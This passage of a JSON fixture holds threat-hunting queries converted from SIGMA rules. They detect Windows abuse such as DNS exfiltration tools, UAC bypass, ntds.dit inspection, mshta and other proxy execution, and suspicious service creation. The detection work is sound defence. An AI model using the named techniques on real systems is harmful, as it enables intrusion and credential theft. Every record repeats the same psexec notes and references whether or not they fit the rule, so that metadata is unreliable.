            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Export-PfxCertificate \" or tgt.process.cmdline contains \"Export-Certificate \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 853
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Phishing Pattern ISO in Archive",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\Winrar.exe\" or src.process.image.path contains \"\\7zFM.exe\" or src.process.image.path contains \"\\peazip.exe\") and (tgt.process.image.path contains \"\\isoburn.exe\" or tgt.process.image.path contains \"\\PowerISO.exe\" or tgt.process.image.path contains \"\\ImgBurn.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 854
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Always Install Elevated Windows Installer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\Windows\\Installer\\\" and tgt.process.image.path contains \"msi\") and tgt.process.image.path contains \"tmp\") or (tgt.process.image.path contains \"\\msiexec.exe\" and (tgt.process.integrityLevel in (\"System\",\"S-1-16-16384\")))) and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and (not (src.process.image.path=\"C:\\Windows\\System32\\services.exe\" or (tgt.process.cmdline contains \"\\system32\\msiexec.exe /V\" or src.process.cmdline contains \"\\system32\\msiexec.exe /V\") or src.process.image.path contains \"C:\\ProgramData\\Sophos\\\" or src.process.image.path contains \"C:\\ProgramData\\Avira\\\" or (src.process.image.path contains \"C:\\Program Files\\Avast Software\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Avast Software\\\") or (src.process.image.path contains \"C:\\Program Files\\Google\\Update\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Google\\Update\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 855
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a new service using the \"sc.exe\" utility.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Service Creation Using Sc.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" and tgt.process.cmdline contains \"binPath\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 856
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Windows binaries from within a WSL instance.\nThis could be used to masquerade parent-child relationships\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Windows Binary Executed From WSL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path matches \"[a-zA-Z]:\\\\\\\\\" and tgt.process.image.path contains \"\\\\wsl.localhost\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 857
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Invoke-ATHRemoteFXvGPUDisablementCommand\" or tgt.process.cmdline contains \"Invoke-ATHRemoteFXvGPUDisableme\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 858
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of Appvlp.EXE\nAppvlp or the Application Virtualization Utility is included with Microsoft Office. Attackers are able to abuse \"AppVLP\" to execute shell commands.\nNormally, this binary is used for Application Virtualization, but it can also be abused to circumvent the ASR file path rule folder\nor to mark a file as a system file.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of Appvlp.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\appvlp.exe\" and (not (tgt.process.image.path contains \":\\Windows\\SysWOW64\\rundll32.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\rundll32.exe\")) and (not ((tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\msoasb.exe\") or ((tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\SkypeSrv\\\") and tgt.process.image.path contains \"\\SKYPESERVER.EXE\") or (tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\MSOUC.EXE\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 859
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1218",
                "t1059"
            ],
            "name": "MSHTA Suspicious Execution 01",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\mshta.exe\" and (tgt.process.cmdline contains \"vbscript\" or tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".png\" or tgt.process.cmdline contains \".lnk\" or tgt.process.cmdline contains \".xls\" or tgt.process.cmdline contains \".doc\" or tgt.process.cmdline contains \".zip\" or tgt.process.cmdline contains \".dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 860
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Provlaunch.EXE Binary Proxy Execution Abuse",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\provlaunch.exe\" and (not ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 861
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a new service using powershell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Service Creation Using PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"New-Service\" and tgt.process.cmdline contains \"-BinaryPathName\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 862
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047"
            ],
            "name": "Script Event Consumer Spawning Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\scrcons.exe\" and (tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\msbuild.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 863
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "PUA - DIT Snapshot Viewer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ditsnap.exe\" or tgt.process.cmdline contains \"ditsnap.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 864
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Well-known DNS Exfiltration tools execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048",
                "t1071",
                "t1132"
            ],
            "name": "DNS Exfiltration and Tunneling Tools Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\iodine.exe\" or tgt.process.image.path contains \"\\dnscat2\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 865
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \":\\Windows\\TEMP\\ScreenConnect\\\" and src.process.cmdline contains \"run.cmd\") and (tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wevtutil.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 866
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the Installation of a Exchange Transport Agent",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "MSExchange Transport Agent Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"Install-TransportAgent\") | columns AssemblyPath",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 867
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Windows Media Player - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path=\"C:\\Program Files\\Windows Media Player\\osk.exe\" or (tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and src.process.cmdline=\"\\\"C:\\Windows\\system32\\mmc.exe\\\" \\\"C:\\Windows\\system32\\eventvwr.msc\\\" /s\")) and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 868
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"msdt.exe\" using an answer file which is simulating the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility tab)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute MSDT Via Answer File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\msdt.exe\" and tgt.process.cmdline contains \"\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml\") and (tgt.process.cmdline contains \" -af \" or tgt.process.cmdline contains \" /af \")) and (not src.process.image.path contains \"\\pcwrun.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 869
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Visual Studio NodejsTools PressAnyKey Arbitrary Binary Execution",
